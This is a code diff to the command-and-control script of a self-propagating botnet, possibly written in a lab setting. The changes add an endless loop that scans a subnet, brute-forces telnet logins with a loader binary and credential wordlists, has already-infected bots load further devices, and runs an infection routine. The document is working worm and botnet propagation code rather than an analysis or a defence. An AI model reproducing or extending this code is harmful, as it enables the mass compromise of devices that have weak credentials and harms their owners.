@@ -28,10 +28,17 @@ def get_con():
 def main():
     print(f"self_ip: {self_ip}")
     scan(True, "172.18.0.0", "28")
+    time.sleep(1)
     brute_next_device()
     time.sleep(1) # ugly but works
     asyncio.run(infect_victims())
-    scan(False, "172.18.0.0", "28")
+    n_bruteforced = 0
+    while True:
+        if (brute_next_device() == -1):
+            scan(False, "172.18.0.0", "28")
+            continue;
+        n_bruteforced += 1
+        asyncio.run(infect_victims())
 
 
 # this and the below function install programs have the purpose of
@@ -91,23 +98,8 @@ def scan(from_root, iprange, ipmask):
             return
         (device_id,) = row
         instruction = f"scan {iprange} {ipmask}"
-        print("Instructing {device_id} to scan {iprange}/{ipmask}")
+        print(f"Instructing {device_id} to scan {iprange}/{ipmask}")
         give_instruction(instruction, device_id)
-
-def update_bruted_status():
-    con = get_con()
-    con.execute("""
-        UPDATE devices_tobrute
-        SET bruted = 1
-        WHERE device_id IN (
-            SELECT device_id
-            FROM instructions
-            WHERE instruction LIKE 'load%'
-              AND status = 1
-        )
-    """)
-    con.commit()
-    con.close()
 
 def give_instruction(instruction, device_id):
     con = get_con()
@@ -123,10 +115,9 @@ def give_instruction(instruction, device_id):
     con.commit()
     con.close()
 
-
 # picks first device from db row and brutes it, marks as bruted and adds to devices
 def brute_next_device():
-    update_bruted_status()
+    print("Bruting next device\n")
     con = get_con()
     rows = con.execute(
         """
@@ -135,9 +126,13 @@ def brute_next_device():
         WHERE bruted = 0
     """).fetchone()
 
+    if rows == None:
+        con.close()
+        return -1
     device_id, ip, scanned_by_ip = rows
     if (scanned_by_ip == self_ip):
         # spawn loader in this device
+        print("Bruteforcing from CnC\n")
         rc = subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
         print(f"rc: {rc}\n")
         if rc.returncode == 0:
@@ -148,7 +143,15 @@ def brute_next_device():
                 WHERE device_id = (?)
             """, [device_id])
             con.commit()
-    else:
+    else:  
+        print("Bruteforcing from bots\n")
+        rows = con.execute("""
+            SELECT device_id
+            FROM devices
+            WHERE ip = ?
+        """, [scanned_by_ip]).fetchone()
+        tasked_id = rows[0]
+        print (tasked_id)
         instruction = f"load {ip}"
         # does not insert instruction while device still has an ongoing one
         con.execute("""
@@ -158,8 +161,8 @@ def brute_next_device():
             DO UPDATE SET
                 instruction = excluded.instruction,
                 status = excluded.status
-            WHERE excluded.status = 1
-        """, [device_id, instruction, 0])
+            WHERE status = 1
+        """, [tasked_id, instruction, 0])
         con.commit()
     con.close()
 
